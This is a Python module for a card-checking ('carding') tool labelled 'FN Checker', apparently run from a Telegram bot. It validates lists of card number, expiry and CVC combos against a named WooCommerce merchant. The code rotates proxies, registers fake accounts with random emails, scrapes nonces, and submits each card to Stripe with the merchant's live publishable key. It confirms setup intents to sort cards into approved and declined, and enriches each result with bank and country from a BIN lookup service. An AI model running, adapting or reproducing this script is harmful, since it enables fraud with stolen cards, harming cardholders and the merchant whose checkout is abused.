# stripeauth.py - Gate 1: Stripe Auth (fancyimpress.com)
import aiohttp
import asyncio
import re
import random
import string
import json
import logging
from datetime import datetime

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class StripeAuthGate:
    def __init__(self):
        self.proxy_pool = []
        self.request_timeout = aiohttp.ClientTimeout(total=70)
        self.stripe_key = "pk_live_51IcTUHEZ8uTrpn7wTEclyYcnuG2kTGBaDYArq5tp4r4ogLSw6iE9OJ661ELpRKcP20kEjGyAPZtbIqwg3kSGKYTW00MHGU0Jsk"
        self.base_url = "https://fancyimpress.com"
        self.bin_cache = {}

    def load_proxies(self):
        import os
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=20))
        number = ''.join(random.choices(string.digits, k=4))
        return f"{name}{number}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'bin': data.get('bin', 'N/A'),
                            'brand': data.get('brand', 'N/A'),
                            'country': data.get('country_name', 'N/A'),
                            'country_flag': data.get('country_flag', ''),
                            'country_currencies': data.get('country_currencies', ['N/A']),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'type': data.get('type', 'N/A')
                        }
                        return self.bin_cache[bin_number]
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
        return None

    async def process_card(self, combo):
        """Gate 1: Stripe Auth processing logic (fancyimpress.com)"""
        start_time = datetime.now()
        error_message = None
        status = "approved"
        
        try:
            if len(combo.split("|")) < 4:
                return False, status, "Invalid card format"

            proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            
            card_data = combo.split("|")
            n = card_data[0]
            mm = card_data[1]
            yy = card_data[2]
            cvc = card_data[3]
            
            if "20" in yy:
                yy = yy.split("20")[1]

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cache-Control': 'max-age=0',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://fancyimpress.com',
                'Referer': 'https://fancyimpress.com/my-account/',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"'
            }

            async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
                async with session.get(f'{self.base_url}/my-account/', headers=headers, proxy=proxy) as response:
                    response_text = await response.text()
                    nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response_text)
                    if not nonce_match:
                        return False, status, "Failed to get registration nonce"
                    nonce1 = nonce_match.group(1)

                email = self.generate_random_account()
                reg_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': f'{self.base_url}/my-account/',
                    'wc_order_attribution_session_start_time': '2025-12-01 09:27:53',
                    'wc_order_attribution_session_pages': '2',
                    'wc_order_attribution_session_count': '2',
                    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                    'woocommerce-register-nonce': nonce1,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                
                async with session.post(f'{self.base_url}/my-account/', headers=headers, data=reg_data, proxy=proxy) as response:
                    if response.status != 200:
                        return False, status, "Account registration failed"

                async with session.get(f'{self.base_url}/my-account/add-payment-method/', headers=headers, proxy=proxy) as response:
                    response_text = await response.text()
                    payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response_text)
                    if not payment_nonce_match:
                        return False, status, "Failed to get payment nonce"
                    payment_nonce = payment_nonce_match.group(1)

                stripe_headers = {
                    'accept': 'application/json',
                    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'priority': 'u=1, i',
                    'referer': 'https://js.stripe.com/',
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-site',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36'
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': n,
                    'card[cvc]': cvc,
                    'card[exp_year]': yy,
                    'card[exp_month]': mm,
                    'allow_redisplay': 'unspecified',
                    'billing_details[address][postal_code]': '10006',
                    'billing_details[address][country]': 'US',
                    'pasted_fields': 'number',
                    'payment_user_agent': 'stripe.js/cba9216f35; stripe-js-v3/cba9216f35; payment-element; deferred-intent',
                    'referrer': 'https://fancyimpress.com',
                    'client_attribution_metadata[client_session_id]': '5e87df1d-037b-4347-bf59-a0275ab75d8c',
                    'client_attribution_metadata[merchant_integration_source]': 'elements',
                    'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                    'client_attribution_metadata[merchant_integration_version]': '2021',
                    'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                    'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                    'client_attribution_metadata[elements_session_config_id]': 'b355f674-ee2e-4ad4-8466-d4c4194efa13',
                    'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                    'guid': '709da624-dcd1-4705-ab97-bae288dcf2dbabb8f4',
                    'muid': 'd1756bf1-2ac1-4a34-b974-a6ec6e709b0f2eee97',
                    'sid': '4d7f4d0e-fe0b-4da9-9966-1f540326a434c5bdc1',
                    'key': self.stripe_key,
                    '_stripe_version': '2024-06-20'
                }
                
                async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy) as stripe_res:
                    stripe_response_text = await stripe_res.text()
                    stripe_json = json.loads(stripe_response_text) if stripe_response_text else {}
                    
                    if stripe_res.status != 200 or 'id' not in stripe_json:
                        if 'error' in stripe_json:
                            error_message = stripe_json['error'].get('message', 'Unknown error')
                        else:
                            error_message = "Payment method creation failed"
                        logger.error(f"Stripe error: {stripe_response_text}")
                        return False, status, error_message
                    
                    payment_method_id = stripe_json['id']

                headers = {
                    'Accept': '*/*',
                    'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                    'Connection': 'keep-alive',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://fancyimpress.com',
                    'Referer': 'https://fancyimpress.com/my-account/add-payment-method/',
                    'Sec-Fetch-Dest': 'empty',
                    'Sec-Fetch-Mode': 'cors',
                    'Sec-Fetch-Site': 'same-origin',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
                    'X-Requested-With': 'XMLHttpRequest',
                    'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                
                confirm_data = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': payment_method_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': payment_nonce,
                }
                
                async with session.post(f'{self.base_url}/wp-admin/admin-ajax.php', headers=headers, data=confirm_data, proxy=proxy) as confirm_res:
                    confirm_response_text = await confirm_res.text()
                    logger.info(f"Full site response: {confirm_response_text}")
                    
                    if confirm_response_text:
                        try:
                            confirm_json = json.loads(confirm_response_text)
                            success = confirm_json.get("success")
                            status_data = confirm_json.get("data", {}).get("status")
                            
                            if success is True and status_data == "succeeded":
                                check_time = (datetime.now() - start_time).total_seconds()
                                return combo, status, None
                            else:
                                error_message = "Card declined"
                                if confirm_json.get("data", {}).get("error", {}).get("message"):
                                    error_message = confirm_json["data"]["error"]["message"]
                                elif confirm_json.get("message"):
                                    error_message = confirm_json["message"]
                                
                                logger.error(f"Site error response: {confirm_response_text}")
                                return False, status, error_message
                        except json.JSONDecodeError:
                            error_message = "Invalid response from server"
                            return False, status, error_message
                    else:
                        error_message = "Empty response from server"
                        return False, status, error_message

        except aiohttp.ClientError as e:
            error_message = f"Network error: {str(e)}"
            return False, status, error_message
        except asyncio.TimeoutError:
            error_message = "Request timeout"
            return False, status, error_message
        except Exception as e:
            logger.error(f"Processing error: {str(e)}")
            error_message = f"System error: {str(e)}"
            return False, status, error_message

    async def format_approval_message(self, combo, bin_info, check_time, user):
        bin_info = bin_info or {}
        username = f"@{user.username}" if user.username else user.full_name
        return f"""
<b>FN Checker</b>
- - - - - - - - - - - - - - - - - - - - - - - -
[⌯] <b>Card</b> ⌁ <code>{combo}</code>
[⌯] <b>Status</b> ⌁ Approved ✅
[⌯] <b>Result</b> ⌁ Card Added Successfully

[⌯] <b>Bin</b> ⌁ {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}
[⌯] <b>Bank</b> ⌁ {bin_info.get('bank', 'N/A')}
[⌯] <b>Country</b> ⌁ {bin_info.get('country', 'N/A')} {bin_info.get('country_flag', '')}

[⌯] <b>Gate</b> ⌁ Stripe Auth
[⌯] <b>Time</b> ⌁ {check_time:.2f}s
[⌯] <b>Used By</b> ⌁ {username}
- - - - - - - - - - - - - - - - - - - - - - - -
"""

    async def format_declined_message(self, combo, bin_info, check_time, error_message, user):
        bin_info = bin_info or {}
        username = f"@{user.username}" if user.username else user.full_name
        return f"""
<b>FN Checker</b>
- - - - - - - - - - - - - - - - - - - - - - - -
[⌯] <b>Card</b> ⌁ <code>{combo}</code>
[⌯] <b>Status</b> ⌁ Declined ❌
[⌯] <b>Result</b> ⌁ {error_message or 'Your card was declined.'}

[⌯] <b>Bin</b> ⌁ {bin_info.get('brand', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('level', 'N/A')}
[⌯] <b>Bank</b> ⌁ {bin_info.get('bank', 'N/A')}
[⌯] <b>Country</b> ⌁ {bin_info.get('country', 'N/A')} {bin_info.get('country_flag', '')}

[⌯] <b>Gate</b> ⌁ Stripe Auth
[⌯] <b>Time</b> ⌁ {check_time:.2f}s
[⌯] <b>Used By</b> ⌁ {username}
- - - - - - - - - - - - - - - - - - - - - - - -
"""
